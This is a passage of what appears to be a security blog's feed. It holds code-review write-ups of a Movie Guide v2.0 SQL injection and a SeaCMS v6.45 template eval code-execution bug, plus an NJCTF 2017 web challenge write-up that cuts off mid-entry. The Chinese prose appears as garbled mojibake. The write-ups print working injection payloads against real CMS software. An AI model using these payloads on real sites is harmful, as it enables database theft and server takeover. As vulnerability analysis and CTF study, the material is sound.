      <category term="hitbxctf" scheme="http://blog.0kami.cn/tags/hitbxctf/"/>
    
  </entry>
  
  <entry>
    <title>ã€Code Analysisã€‘MovieGuide v2.0 SQLi</title>
    <link href="http://blog.0kami.cn/2018/02/03/MovieGuide2SQLi/"/>
    <id>http://blog.0kami.cn/2018/02/03/MovieGuide2SQLi/</id>
    <published>2018-02-03T05:37:35.000Z</published>
    <updated>2018-02-03T11:42:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>Detail: <a href="https://www.exploit-db.com/exploits/43346/" target="_blank" rel="noopener">Movie Guide v2.0 SQL Injection</a></p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç²—ç³™çš„å¼€æºcmsï¼Œæ€»ä½“æ¥è¯´å¹¶æ²¡æœ‰å¯¹è¾“å…¥è¾“å‡ºåšå®‰å…¨å¤„ç†ï¼Œä»PoCå…¥æ‰‹ï¼Œé€‰ä¸€ä¸ªè¿˜åŸä¸€ä¸‹æ¼æ´å½¢æˆè¿‡ç¨‹ã€‚</p><h3 id="PoCï¼šindex-php-md-SQL"><a href="#PoCï¼šindex-php-md-SQL" class="headerlink" title="PoCï¼šindex.php?md=[SQL]"></a>PoCï¼šindex.php?md=[SQL]</h3><p>å®šä½ä¸€ä¸‹mdå‚æ•°<br>layout.phpä¸ºè¯¥cmsçš„ä¸»è¦å…¥å£å¤„ç†,ä¸‹è¿°çš„å˜é‡å‡æ²¡æœ‰é€šè¿‡å®‰å…¨å¤„ç†ï¼Œç›´æ¥SQLè¯­å¥ï¼Œä»è€Œéƒ½å¯ä»¥ç”¨äºæ•°æ®åº“æ³¨å…¥ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Get the passed variables.</span></span><br><span class="line">$mterm = filter_input(INPUT_POST, <span class="string">'tterm'</span>);</span><br><span class="line">$cterm = filter_input(INPUT_POST, <span class="string">'gterm'</span>);</span><br><span class="line">$lterm = filter_input(INPUT_GET, <span class="string">'gterm'</span>);</span><br><span class="line">$yterm = filter_input(INPUT_GET, <span class="string">'year'</span>);</span><br><span class="line">$md = filter_input(INPUT_GET, <span class="string">'md'</span>);</span><br><span class="line">$actorname = filter_input(INPUT_GET, <span class="string">'actor'</span>);</span><br><span class="line">$directorname = filter_input(INPUT_GET, <span class="string">'director'</span>);</span><br></pre></td></tr></table></figure></p><p>ç›´æ¥æ‹¼æ¥å…¥SQLè¯­å¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å®ƒçš„PoCï¼Œä»¥å‰æ²¡æœ‰è§è¿‡ç±»ä¼¼çš„:bï¼ŒPoCä¸­ä½¿ç”¨äº†export_setå‡½æ•°</p><h3 id="EXPORT-SET-bits-on-off-separator-number-of-bits"><a href="#EXPORT-SET-bits-on-off-separator-number-of-bits" class="headerlink" title="EXPORT_SET(bits,on,off[,separator[,number_of_bits]])"></a><code>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])</code></h3><p><code>Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of âˆ’1 is effectively the same as 64.</code></p><p>åˆ†è§£ä¸€ä¸‹PoC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*!02222UNION*/</span><br><span class="line">(</span><br><span class="line">    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,</span><br><span class="line">        (</span><br><span class="line">            /*!02222Select*/ </span><br><span class="line">                export_set(5,@a:=0,</span><br><span class="line">                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a</span><br><span class="line">                    export_set(5,</span><br><span class="line">                        export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name]</span><br><span class="line">                    ,/*!02222column_name*/,&apos;\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\n:columns_name]</span><br><span class="line">                )</span><br><span class="line">            ,@a,2)//set @a split char</span><br><span class="line">        )</span><br><span class="line">    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239</span><br><span class="line">    )-- -</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯export_setå‡½æ•°çš„noï¼Œoffä½ç½®æ¥dumpæ•°æ®ã€‚</p><ul><li>é¦–å…ˆé€šè¿‡@a:=0ï¼Œå®šä¹‰å˜é‡aä¸º0ï¼ˆå¯èƒ½è·Ÿmysqlç‰ˆæœ¬æœ‰å…³ç³»ï¼Œ5.7.xä¸‹çš„mysqlæ— æ³•ç”¨@:=0æ¥å®šä¹‰ï¼‰</li><li>æœ€é‡Œé¢çš„export_setï¼Œå°†table_name dumpå‡ºæ¥ï¼ˆç»“æœä¸º<code>0&lt;li&gt;table_name</code>ï¼‰</li><li>æ¥ä¸‹æ¥çš„ä¸€ä¸ªexport_setï¼Œå°†columns_name dumpå‡ºæ¥(ç»“æœä¸º<code>0&lt;li&gt;table_name\n:columns_name</code>)</li><li><code>select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\n:&#39;,2)</code>å°†ä¸Šè¿°çš„æ•°æ®èµ‹å€¼ç»™å˜é‡a</li><li>æœ€åç”¨æœ€åä¸€ä¸ªexport_setï¼Œç”¨@aåšåˆ†éš”ç¬¦ï¼Œå°†æ•°æ®dumpå‡ºæ¥</li></ul><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>è¯¥cmsçš„æ³¨å…¥æ¼æ´å¾ˆå¸¸è§„ï¼Œä¸»è¦æ˜¯å­¦ä¹ åˆ†æäº†è¯¥PoCï¼Œèƒ½åœ¨æœªæ¥æ³¨å…¥ç»•è¿‡çš„åœ°æ–¹åº”ç”¨ã€‚</p><ol><li>mysqlçš„è‡ªå®šä¹‰å˜é‡@çš„åº”ç”¨ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ¶ˆé™¤ç©ºæ ¼ï¼Œä»¥åŠæ­£åˆ™<code>\bwhere\b</code>çš„ç»•è¿‡</li><li>/!02222select*/è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯ç»å¸¸å¬è¯´ï¼Œä¹Ÿåœ¨è¿™é‡Œç”¨åˆ°äº†ï¼Œä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚</li><li>export_setçš„åº”ç”¨ï¼Œæ¯”è¾ƒé‡è¦çš„åº”ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯ç”¨äºç»•è¿‡</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h1&gt;&lt;p&gt;Detail: &lt;a href=&quot;https://www.exploit-db.com/exploits/43346/&quot; t
      
    
    </summary>
    
      <category term="codereview" scheme="http://blog.0kami.cn/categories/codereview/"/>
    
    
      <category term="cms" scheme="http://blog.0kami.cn/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>ã€Code Reviewã€‘seacms v6.5 å‰å°getshell</title>
    <link href="http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/"/>
    <id>http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/</id>
    <published>2017-03-16T07:47:15.000Z</published>
    <updated>2018-01-25T07:28:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å‰æ®µæ—¶é—´æ”¾åœ¨<a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10291" target="_blank" rel="noopener">90sec</a>ä¸Šçš„ä¸€ç¯‡ä»£ç å®¡è®¡ï¼Œæ”¶æ‹¾ä¸€ä¸‹æ”¾åˆ°è‡ªå·±åšå®¢ä¸Š<br><a id="more"></a></p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>cmsç‰ˆæœ¬ï¼š6.45<br>ç›´æ¥ä¸Šä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">return $content;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[0]);</span><br><span class="line">$elseIfFlag=false;</span><br><span class="line">for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">$strIf=$iar[1][$m];</span><br><span class="line">$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">$strThen=$iar[2][$m];</span><br><span class="line">$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">$strThen1=$elsearray[0];</span><br><span class="line">$strElse1=$elsearray[1];</span><br><span class="line">                    echo &quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;;</span><br><span class="line">                    eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">$elseIfArrayLen=count($elseIfArray);</span><br><span class="line">$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">$resultStr=$elseIfSubArray[1];</span><br><span class="line">$elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">@eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">$content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢ä¸»è¦é€»è¾‘ä¸ºè§£æhtmlæ–‡ä»¶ä¸­çš„{if:}{end if}æ ‡ç­¾ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰åšä»»ä½•å¤„ç†å°±evalï¼Œé‚£ä¹ˆæˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹å¯¹åº”è°ƒç”¨çš„åœ°æ–¹ä¼šä¸ä¼šæœ‰æ¼æ´ã€‚<br>ä¸»è¦å…³æ³¨å‰å°ï¼Œæ‰¾åˆ°ä¸€å¤„è§£ææœç´¢ç»“æœçš„é¡µé¢ï¼ˆsearch.phpï¼‰ï¼Œä»£ç æ¯”è¾ƒå¤šï¼Œä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ã€‚<br>æ‰¾åˆ°è°ƒç”¨çš„ä½ç½®line 212<code>$content=$mainClassObj-&gt;parseIf($content);</code><br>å¾€ä¸Šçœ‹ï¼Œå‘ç°ä»–çš„é€»è¾‘æ˜¯å…ˆè§£æå…¶ä»–ç±»å‹çš„æ ‡ç­¾ï¼Œæ¯”å¦‚<code>{searchpage:page}</code><br>é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯ï¼Œä¸»è¦æ˜¯2ç‚¹ï¼ŒæŸ¥æ‰¾å¯¹åº”ifæ ‡ç­¾å¯æ§çš„ä½ç½®ï¼Œå¦ä¸€ç§å°±æ˜¯æŸ¥æ‰¾å…¶ä»–æ ‡ç­¾çš„å¯æ§å†…å®¹ï¼Œå†™å…¥ifæ ‡ç­¾<br>æˆ‘æ‰¾åˆ°ä¸€å¤„å…¶ä»–æ ‡ç­¾å¯æ§ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†çš„ä½ç½®ï¼Œç›´æ¥å†™å…¥ifæ ‡ç­¾è¯­å¥å³å¯é€ æˆä»»æ„ä»£ç æ‰§è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function echoSearchPage()</span><br><span class="line">&#123;</span><br><span class="line">        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">        $order = !empty($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>orderå˜é‡å¯æ§å¹¶ä¸”åœ¨è°ƒç”¨parseIfå‡½æ•°å‰å…ˆè§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡orderå†™å…¥ifæ ‡ç­¾ã€‚<br>æŸ¥çœ‹ä¸€ä¸‹å…·ä½“htmlä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;æœ€æ–°ä¸Šæ˜ &lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;æœ€è¿‘çƒ­æ’­&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;è¯„åˆ†æœ€é«˜&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥æ„é€ pocäº†ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæŠŠå‰é¢çš„ifæ ‡ç­¾è¯­å¥é—­åˆï¼Œå†™å…¥æ¶æ„ä»£ç å¹¶é—­åˆåé¢çš„ifæ ‡ç­¾ã€‚<br>exampleï¼š<code>}{end if}{if:1)phpinfo();if(1}{end if}</code><br>æœ¬åœ°éªŒè¯ä¸€ä¸‹<br><img src="http://blog.0kami.cn/img/seacms/1.png" alt=""></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´ï¼Œä¹Ÿå¯ä»¥è¢«ç§°ä¸ºæ¨¡ç‰ˆè§£æå§æˆ‘è§‰å¾—ï¼šï¼‰<br>ps: åæ‚”å•Šï¼Œæ²¡æœ‰å…ˆæäº¤ä¸ªpocå¹³å°T_T</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å‰æ®µæ—¶é—´æ”¾åœ¨&lt;a href=&quot;https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=10291&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;ä¸Šçš„ä¸€ç¯‡ä»£ç å®¡è®¡ï¼Œæ”¶æ‹¾ä¸€ä¸‹æ”¾åˆ°è‡ªå·±åšå®¢ä¸Š&lt;br&gt;
    
    </summary>
    
      <category term="codereview" scheme="http://blog.0kami.cn/categories/codereview/"/>
    
    
      <category term="cms" scheme="http://blog.0kami.cn/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFã€‘NJCTF2017 writeup</title>
    <link href="http://blog.0kami.cn/2017/03/15/old-njctf-2017/"/>
    <id>http://blog.0kami.cn/2017/03/15/old-njctf-2017/</id>
    <published>2017-03-15T03:29:05.000Z</published>
    <updated>2018-01-25T07:31:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>è¾èŒåæ²¡äº‹æƒ…å¹²ï¼Œåˆšå¥½èµ¶ä¸Šnjctfï¼Œè¿˜æ˜¯ä¸€æ ·èœå•Šï¼Œåªåšäº†7é“é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›ğŸ’ªï¼ˆps:æ¯•ä¸šè®¾è®¡ä»€ä¹ˆé¬¼å•Šï¼‰å†™ä¸€ä¸‹webçš„writeupï¼Œç”±äºé¢˜ç›®è¿˜å¼€ç€ï¼ŒæŠŠæ²¡åšå‡ºæ¥çš„åšä¸€éï¼Œçºªå½•ä¸€ä¸‹æˆ‘è§‰å¾—æœ‰å¿…è¦è®°çš„é¢˜<br><a id="more"></a></p><h1 id="Webé¢˜"><a href="#Webé¢˜" class="headerlink" title="Webé¢˜"></a>Webé¢˜</h1><h3 id="Loginï¼ˆ100ï¼‰"><a href="#Loginï¼ˆ100ï¼‰" class="headerlink" title="Loginï¼ˆ100ï¼‰"></a>Loginï¼ˆ100ï¼‰</h3><p>å¥½å§ï¼Œè¿™é“é¢˜å–äº†å·§ï¼Œè°è®©å¤§é»‘å®¢ä»¬éƒ½æ˜¯å¼±å¯†ç å‘¢ï¼ï¼ï¼ï¼<br>ç”±äºæ²¡æœ‰åšéªŒè¯ç æœºåˆ¶ï¼Œæ‰€ä»¥æ‰«äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œç„¶åâ€¦ç„¶åå°±è¿›å»å•¦<br>å…¶å®è¿™é“é¢˜è€ƒçš„æ˜¯mysqlçš„é•¿åº¦é™åˆ¶æ¼æ´ã€‚åˆ©ç”¨2ä¸ªmysqlçš„ç‰¹æ€§</p><ol><li>å½“æ•°æ®è¶…è¿‡å»ºè¡¨æ—¶çš„è§„å®šçš„æ•°æ®å¤§å°ï¼Œmysqlå°†è¶…è¿‡çš„éƒ¨åˆ†æˆªæ–­</li><li>å½“selectæ—¶whereæŸ¥è¯¢å­—å¥ä¸­çš„æ•°æ®å¦‚æœæœ€åä»¥ç©ºæ ¼ç»“å°¾ï¼Œmysqlé»˜è®¤å°†ç©ºæ ¼å»é™¤æŸ¥è¯¢<br>é‚£ä¹ˆåˆ©ç”¨è¿™2ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åªè¦æ³¨å†Œä¸€ä¸ªadmin+N*%20+xå°±å¯ä»¥å·²adminç™»é™†ï¼Œç„¶ågetflagï¼šNJCTF{4R3_Y0u_7H3_Re41_aDM1N?}</li></ol><h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag(100)"></a>Get Flag(100)</h3><p>è¿™é“é¢˜è€ƒäº†å‘½ä»¤æ‰§è¡Œæ¼æ´<br>é¦–å…ˆå‘ç°å­˜åœ¨æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå°è¯•è¯»å–ä¸€ä¸‹æºç ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯app.py<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/1.png" alt=""><br>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œå¹¶ä¸”æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç”¨&amp;å°±å¯ä»¥ç»•è¿‡ã€‚<br>ls æŸ¥çœ‹ä¸€ä¸‹<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/2.png" alt=""><br>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶<br><code>9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</code><br>catä¸€æ³¢ï¼Œè¿™é‡Œçš„ç‰¹æ®Šå­—ç¬¦è½¬ç§»æ˜¯å…³é”®<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/3.png" alt=""></p><h3 id="come-on-200"><a href="#come-on-200" class="headerlink" title="come on(200)"></a>come on(200)</h3><p>å…·ä½“çœ‹å¤§ä½¬ä»¬çš„writeupå³å¯ï¼Œè¿™é“é¢˜ä¸»è¦å­¦åˆ°äº†å…¶ç›²æ³¨çš„æ³¨å…¥æ–¹å¼ã€‚<br>binaryå‡½æ•°ç”¨æ¥åŒºåˆ†å¤§å°å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx like x%</span><br><span class="line">select xxx from xxx like xx%</span><br><span class="line">select xxx from xxx like xxx%</span><br><span class="line">select xxx from xxx like xxxx%</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>é€šè¿‡likeæ¥ä½å‡ºæ•°æ®</p><h3 id="Be-Admin-300"><a href="#Be-Admin-300" class="headerlink" title="Be Admin(300)"></a>Be Admin(300)</h3><p>é¦–å…ˆå‘ç°æœ‰.bakæ–‡ä»¶ï¼Œä¸‹ä¸‹æ¥çœ‹ä¸€ä¸‹,å‘ç°è¿™é“é¢˜ä¸»è¦è€ƒçš„æ˜¯cbcå­—èŠ‚ç¿»è½¬æ”»å‡»å’Œpadding oracle attack.<br>é¦–å…ˆç”±äºç™»é™†å‡ºå­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®ä¸­çš„encrypt_passå–å‡ºæ¥<br>ç™»é™†ç»•è¿‡å¯ä»¥é€šè¿‡phpå¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡ï¼Œadminï¼0å³å¯ç™»é™†<br>è¦é€šè¿‡cbcå­—èŠ‚ç¿»è½¬å¿…é¡»çŸ¥é“defaultIdçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·‘å‡ºdefaultIdçš„å€¼<br>padding oracle attackå‚è€ƒ<a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">padding oracle attack</a><br>ç¬¦åˆæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µï¼š</p><ol><li>å·²çŸ¥çœŸå®IV</li><li>å·²çŸ¥å¯¹åº”cipher text</li><li>å½“è§£å¯†å¤±è´¥ERRORé”™è¯¯<br>é¢˜ç›®ç¯å¢ƒå¯èƒ½åäº†ï¼Œæœ¬åœ°æ­ä¸€ä¸‹ï¼Œè·‘ä¸€ä¸‹ä¸­é—´å€¼<br>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯padding oracle 